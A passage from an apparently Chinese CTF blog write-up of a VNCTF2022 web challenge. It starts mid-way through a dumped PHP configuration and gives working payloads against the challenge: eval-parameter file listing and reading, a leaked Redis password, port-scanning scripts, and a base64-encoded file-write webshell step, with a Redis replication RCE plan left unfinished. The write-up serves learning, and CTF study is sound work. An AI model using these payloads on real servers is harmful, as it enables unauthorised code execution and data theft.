["auto_append_file"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["auto_detect_line_endings"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["auto_globals_jit"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(6) } ["auto_prepend_file"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["browscap"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["curl.cainfo"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["date.default_latitude"]=> array(3) { ["global_value"]=> string(7) "31.7667" ["local_value"]=> string(7) "31.7667" ["access"]=> int(7) } ["date.default_longitude"]=> array(3) { ["global_value"]=> string(7) "35.2333" ["local_value"]=> string(7) "35.2333" ["access"]=> int(7) } ["date.sunrise_zenith"]=> array(3) { ["global_value"]=> string(9) "90.583333" ["local_value"]=> string(9) "90.583333" ["access"]=> int(7) } ["date.sunset_zenith"]=> array(3) { ["global_value"]=> string(9) "90.583333" ["local_value"]=> string(9) "90.583333" ["access"]=> int(7) } ["date.timezone"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["default_charset"]=> array(3) { ["global_value"]=> string(5) "UTF-8" ["local_value"]=> string(5) "UTF-8" ["access"]=> int(7) } ["default_mimetype"]=> array(3) { ["global_value"]=> string(9) "text/html" ["local_value"]=> string(9) "text/html" ["access"]=> int(7) } ["default_socket_timeout"]=> array(3) { ["global_value"]=> string(2) "60" ["local_value"]=> string(2) "60" ["access"]=> int(7) } ["disable_classes"]=> array(3) { ["global_value"]=> string(116) "Exception,DirectoryIterator,FilesystemIterator,SplFileObject,SplDoublyLinkedList,Error,ErrorException,RedisException" ["local_value"]=> string(116) "Exception,DirectoryIterator,FilesystemIterator,SplFileObject,SplDoublyLinkedList,Error,ErrorException,RedisException" ["access"]=> int(4) } ["disable_functions"]=> array(3) { ["global_value"]=> string(816) "include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var" ["local_value"]=> string(816) "include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var" ["access"]=> int(4) } ["display_errors"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["display_startup_errors"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["doc_root"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["docref_ext"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["docref_root"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["enable_dl"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["enable_post_data_reading"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(6) } ["engine"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["error_append_string"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["error_log"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["error_prepend_string"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["error_reporting"]=> array(3) { ["global_value"]=> string(5) "32767" ["local_value"]=> string(5) "32767" ["access"]=> int(7) } ["expose_php"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["extension_dir"]=> array(3) { ["global_value"]=> string(55) "/usr/local/lib/php/extensions/no-debug-non-zts-20170718" ["local_value"]=> string(55) "/usr/local/lib/php/extensions/no-debug-non-zts-20170718" ["access"]=> int(4) } ["file_uploads"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["filter.default"]=> array(3) { ["global_value"]=> string(10) "unsafe_raw" ["local_value"]=> string(10) "unsafe_raw" ["access"]=> int(6) } ["filter.default_flags"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["from"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["hard_timeout"]=> array(3) { ["global_value"]=> string(1) "2" ["local_value"]=> string(1) "2" ["access"]=> int(4) } ["highlight.comment"]=> array(3) { ["global_value"]=> string(7) "#FF8000" ["local_value"]=> string(7) "#FF8000" ["access"]=> int(7) } ["highlight.default"]=> array(3) { ["global_value"]=> string(7) "#0000BB" ["local_value"]=> string(7) "#0000BB" ["access"]=> int(7) } ["highlight.html"]=> array(3) { ["global_value"]=> string(7) "#000000" ["local_value"]=> string(7) "#000000" ["access"]=> int(7) } ["highlight.keyword"]=> array(3) { ["global_value"]=> string(7) "#007700" ["local_value"]=> string(7) "#007700" ["access"]=> int(7) } ["highlight.string"]=> array(3) { ["global_value"]=> string(7) "#DD0000" ["local_value"]=> string(7) "#DD0000" ["access"]=> int(7) } ["html_errors"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["iconv.input_encoding"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["iconv.internal_encoding"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["iconv.output_encoding"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["ignore_repeated_errors"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["ignore_repeated_source"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["ignore_user_abort"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["implicit_flush"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["include_path"]=> array(3) { ["global_value"]=> string(20) ".:/usr/local/lib/php" ["local_value"]=> string(20) ".:/usr/local/lib/php" ["access"]=> int(7) } ["input_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["internal_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["last_modified"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["log_errors"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["log_errors_max_len"]=> array(3) { ["global_value"]=> string(4) "1024" ["local_value"]=> string(4) "1024" ["access"]=> int(7) } ["mail.add_x_header"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["mail.force_extra_parameters"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["mail.log"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["max_execution_time"]=> array(3) { ["global_value"]=> string(2) "30" ["local_value"]=> string(2) "30" ["access"]=> int(7) } ["max_file_uploads"]=> array(3) { ["global_value"]=> string(2) "20" ["local_value"]=> string(2) "20" ["access"]=> int(6) } ["max_input_nesting_level"]=> array(3) { ["global_value"]=> string(2) "64" ["local_value"]=> string(2) "64" ["access"]=> int(6) } ["max_input_time"]=> array(3) { ["global_value"]=> string(2) "60" ["local_value"]=> string(2) "60" ["access"]=> int(6) } ["max_input_vars"]=> array(3) { ["global_value"]=> string(4) "1000" ["local_value"]=> string(4) "1000" ["access"]=> int(6) } ["mbstring.detect_order"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.encoding_translation"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(6) } ["mbstring.func_overload"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(4) } ["mbstring.http_input"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.http_output"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.http_output_conv_mimetypes"]=> array(3) { ["global_value"]=> string(31) "^(text/|application/xhtml\+xml)" ["local_value"]=> string(31) "^(text/|application/xhtml\+xml)" ["access"]=> int(7) } ["mbstring.internal_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["mbstring.language"]=> array(3) { ["global_value"]=> string(7) "neutral" ["local_value"]=> string(7) "neutral" ["access"]=> int(7) } ["mbstring.strict_detection"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["mbstring.substitute_character"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["memory_limit"]=> array(3) { ["global_value"]=> string(4) "128M" ["local_value"]=> string(4) "128M" ["access"]=> int(7) } ["mysqlnd.collect_memory_statistics"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["mysqlnd.collect_statistics"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["mysqlnd.debug"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["mysqlnd.fetch_data_copy"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["mysqlnd.log_mask"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["mysqlnd.mempool_default_size"]=> array(3) { ["global_value"]=> string(5) "16000" ["local_value"]=> string(5) "16000" ["access"]=> int(7) } ["mysqlnd.net_cmd_buffer_size"]=> array(3) { ["global_value"]=> string(4) "4096" ["local_value"]=> string(4) "4096" ["access"]=> int(7) } ["mysqlnd.net_read_buffer_size"]=> array(3) { ["global_value"]=> string(5) "32768" ["local_value"]=> string(5) "32768" ["access"]=> int(7) } ["mysqlnd.net_read_timeout"]=> array(3) { ["global_value"]=> string(5) "86400" ["local_value"]=> string(5) "86400" ["access"]=> int(7) } ["mysqlnd.sha256_server_public_key"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(2) } ["mysqlnd.trace_alloc"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["open_basedir"]=> array(3) { ["global_value"]=> string(13) "/var/www/html" ["local_value"]=> string(13) "/var/www/html" ["access"]=> int(7) } ["openssl.cafile"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(2) } ["openssl.capath"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(2) } ["output_buffering"]=> array(3) { ["global_value"]=> string(4) "4096" ["local_value"]=> string(4) "4096" ["access"]=> int(6) } ["output_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["output_handler"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(6) } ["pcre.backtrack_limit"]=> array(3) { ["global_value"]=> string(7) "1000000" ["local_value"]=> string(7) "1000000" ["access"]=> int(7) } ["pcre.jit"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["pcre.recursion_limit"]=> array(3) { ["global_value"]=> string(6) "100000" ["local_value"]=> string(6) "100000" ["access"]=> int(7) } ["phar.cache_list"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["phar.readonly"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["phar.require_hash"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["post_max_size"]=> array(3) { ["global_value"]=> string(2) "8M" ["local_value"]=> string(2) "8M" ["access"]=> int(6) } ["precision"]=> array(3) { ["global_value"]=> string(2) "14" ["local_value"]=> string(2) "14" ["access"]=> int(7) } ["realpath_cache_size"]=> array(3) { ["global_value"]=> string(5) "4096K" ["local_value"]=> string(5) "4096K" ["access"]=> int(4) } ["realpath_cache_ttl"]=> array(3) { ["global_value"]=> string(3) "120" ["local_value"]=> string(3) "120" ["access"]=> int(4) } ["redis.arrays.autorehash"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.functions"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.hosts"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.index"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.names"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.arrays.previous"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.clusters.read_timeout"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.clusters.seeds"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["redis.clusters.timeout"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["register_argc_argv"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["report_memleaks"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["report_zend_debug"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["request_order"]=> array(3) { ["global_value"]=> string(2) "GP" ["local_value"]=> string(2) "GP" ["access"]=> int(6) } ["sendmail_from"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["sendmail_path"]=> array(3) { ["global_value"]=> string(7) " -t -i " ["local_value"]=> string(7) " -t -i " ["access"]=> int(4) } ["serialize_precision"]=> array(3) { ["global_value"]=> string(2) "-1" ["local_value"]=> string(2) "-1" ["access"]=> int(7) } ["session.auto_start"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(2) } ["session.cache_expire"]=> array(3) { ["global_value"]=> string(3) "180" ["local_value"]=> string(3) "180" ["access"]=> int(7) } ["session.cache_limiter"]=> array(3) { ["global_value"]=> string(7) "nocache" ["local_value"]=> string(7) "nocache" ["access"]=> int(7) } ["session.cookie_domain"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.cookie_httponly"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.cookie_lifetime"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["session.cookie_path"]=> array(3) { ["global_value"]=> string(1) "/" ["local_value"]=> string(1) "/" ["access"]=> int(7) } ["session.cookie_secure"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["session.gc_divisor"]=> array(3) { ["global_value"]=> string(4) "1000" ["local_value"]=> string(4) "1000" ["access"]=> int(7) } ["session.gc_maxlifetime"]=> array(3) { ["global_value"]=> string(4) "1440" ["local_value"]=> string(4) "1440" ["access"]=> int(7) } ["session.gc_probability"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.lazy_write"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.name"]=> array(3) { ["global_value"]=> string(9) "PHPSESSID" ["local_value"]=> string(9) "PHPSESSID" ["access"]=> int(7) } ["session.referer_check"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.save_handler"]=> array(3) { ["global_value"]=> string(5) "files" ["local_value"]=> string(5) "files" ["access"]=> int(7) } ["session.save_path"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.serialize_handler"]=> array(3) { ["global_value"]=> string(3) "php" ["local_value"]=> string(3) "php" ["access"]=> int(7) } ["session.sid_bits_per_character"]=> array(3) { ["global_value"]=> string(1) "5" ["local_value"]=> string(1) "5" ["access"]=> int(7) } ["session.sid_length"]=> array(3) { ["global_value"]=> string(2) "26" ["local_value"]=> string(2) "26" ["access"]=> int(7) } ["session.trans_sid_hosts"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["session.trans_sid_tags"]=> array(3) { ["global_value"]=> string(32) "a=href,area=href,frame=src,form=" ["local_value"]=> string(32) "a=href,area=href,frame=src,form=" ["access"]=> int(7) } ["session.upload_progress.cleanup"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(2) } ["session.upload_progress.enabled"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(2) } ["session.upload_progress.freq"]=> array(3) { ["global_value"]=> string(2) "1%" ["local_value"]=> string(2) "1%" ["access"]=> int(2) } ["session.upload_progress.min_freq"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(2) } ["session.upload_progress.name"]=> array(3) { ["global_value"]=> string(27) "PHP_SESSION_UPLOAD_PROGRESS" ["local_value"]=> string(27) "PHP_SESSION_UPLOAD_PROGRESS" ["access"]=> int(2) } ["session.upload_progress.prefix"]=> array(3) { ["global_value"]=> string(16) "upload_progress_" ["local_value"]=> string(16) "upload_progress_" ["access"]=> int(2) } ["session.use_cookies"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.use_only_cookies"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["session.use_strict_mode"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["session.use_trans_sid"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["short_open_tag"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(6) } ["SMTP"]=> array(3) { ["global_value"]=> string(9) "localhost" ["local_value"]=> string(9) "localhost" ["access"]=> int(7) } ["smtp_port"]=> array(3) { ["global_value"]=> string(2) "25" ["local_value"]=> string(2) "25" ["access"]=> int(7) } ["sqlite3.defensive"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["sqlite3.extension_dir"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["sys_temp_dir"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["track_errors"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["unserialize_callback_func"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["upload_max_filesize"]=> array(3) { ["global_value"]=> string(2) "2M" ["local_value"]=> string(2) "2M" ["access"]=> int(6) } ["upload_tmp_dir"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(4) } ["url_rewriter.hosts"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["url_rewriter.tags"]=> array(3) { ["global_value"]=> string(5) "form=" ["local_value"]=> string(5) "form=" ["access"]=> int(7) } ["user_agent"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["user_dir"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["user_ini.cache_ttl"]=> array(3) { ["global_value"]=> string(3) "300" ["local_value"]=> string(3) "300" ["access"]=> int(4) } ["user_ini.filename"]=> array(3) { ["global_value"]=> string(9) ".user.ini" ["local_value"]=> string(9) ".user.ini" ["access"]=> int(4) } ["variables_order"]=> array(3) { ["global_value"]=> string(4) "GPCS" ["local_value"]=> string(4) "GPCS" ["access"]=> int(6) } ["xbithack"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["xmlrpc_error_number"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["xmlrpc_errors"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(4) } ["zend.assertions"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["zend.detect_unicode"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["zend.enable_gc"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["zend.multibyte"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(2) } ["zend.script_encoding"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["zend.signal_check"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(4) } ["zlib.output_compression"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } ["zlib.output_compression_level"]=> array(3) { ["global_value"]=> string(2) "-1" ["local_value"]=> string(2) "-1" ["access"]=> int(7) } ["zlib.output_handler"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(7) } } </code></pre><p>主要看<em><strong>disable_functions/disable_class/open_basedir</strong></em>中的信息<br>使⽤ scandir() 来探测⽬录⽂件发现存在⼀个 secret.rdb ⽂件，构造payload（注意括号里面的.要用双引号或者单引号括起来，感谢桥桥的援助）</p><pre class=" language-1"><code class="language-1">/?exp=var_dump(scandir('.'))array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(10) "secret.rdb" } </code></pre><p>可以直接输出出来，构造</p><pre class=" language-1"><code class="language-1">/?exp=var_dump(highlight_file(end(scandir('.'))));得到： REDIS0008�    redis-ver4.0.9�redis-bits�@�ctime³��a�used-mem��aof-preamble���sercetye_w4nt_a_gir1fri3nd��nR�K��S bool(true) </code></pre><p>可以将文件下载下来，用<a href="https://github.com/sripathikrishnan/redis-rdb-tools/">redis-rdb-tools</a>去解析。<br>可以猜测redis的auth为 ye_w4nt_a_gir1fri3nd，然后就是端⼝扫描寻找redis端⼝的操作，有脚本（官方WP）</p><pre class=" language-php"><code class="language-php"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$t</span><span class="token operator">=</span><span class="token function">stream_socket_server</span><span class="token punctuation">(</span>"tcp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//0.0.0.0:".$i,$ee,$ee2);</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ee2</span> <span class="token operator">===</span> <span class="token string">"Address already in use"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>桥桥博客还有一个脚本</p><pre class=" language-php"><code class="language-php"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$t</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:'.$i);</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">error_get_last</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Connection refused"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后，构造payload</p><pre class=" language-1"><code class="language-1">/?exp=eval(file_put_contents("1.php",base64_decode($_POST['a'])));POST:a=PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg==</code></pre><p>访问/1.php，发现80和8888端口可用<br>其实按照常规思路是可以利⽤蚁剑等⼯具直接连接redis来实现主从复制RCE的，但是分析⼀下蚁剑的流量可以发现蚁剑是利⽤ stream_get_contents() 来实现redis连接交互的，这⾥ban了这个函数，所以需要寻找其他的⽅法来和redis交互。利⽤ get_loaded_extensions() 可以看到PHP加载的插件，从中可以看到题⽬环境中加载了PHP的redis插件（redis.so），翻找⼀下⽂档可以找到这个插件的Redis类中有 rawCommand() ⽅法可以执⾏redis的命令操作。<br>要素⻬全，可以实现redis主从复制RCE，先利⽤ file_put_contents() 来写⼊⼀个redis主从复制RCE的so⽂件，<br>接下来就是构造⼀个反弹Shell的Payload：</p><p>先咕咕了，等学一学redis再来填坑</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VNCTF2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 2018 Online Too 1题解</title>
      <link href="/2022/02/11/BUUCTF%202018%20Online%20Too%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/11/BUUCTF%202018%20Online%20Too%201%E9%A2%98%E8%A7%A3/</url>
      
